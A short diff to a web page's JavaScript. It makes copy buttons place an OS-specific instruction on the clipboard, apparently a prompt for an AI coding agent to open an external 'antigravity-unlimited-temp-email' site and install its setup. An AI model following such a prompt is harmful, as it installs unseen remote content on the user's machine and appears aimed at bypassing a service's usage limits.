@@ -557,7 +557,13 @@
         // Copy functionality (preserved exactly)
         function setupCopyButtons() {
             const copyButtons = document.querySelectorAll('button[id^="copy-"]');
-            const commandText = 'https://antigravity-unlimited-temp-email.vercel.app/ go through fully and install the same setup';
+            let commandText = 'https://antigravity-unlimited-temp-email.vercel.app/ go through fully and install the same setup for windows';
+
+            if (navigator.userAgent.includes('Windows')) {
+                commandText = 'https://antigravity-unlimited-temp-email.vercel.app/ go through fully and install the same setup for windows';
+            } else {
+                commandText = 'https://antigravity-unlimited-temp-email.vercel.app/ go through fully and install the same setup for linux/macos';
+            }
 
             copyButtons.forEach(button => {
                 button.addEventListener('click', function() {
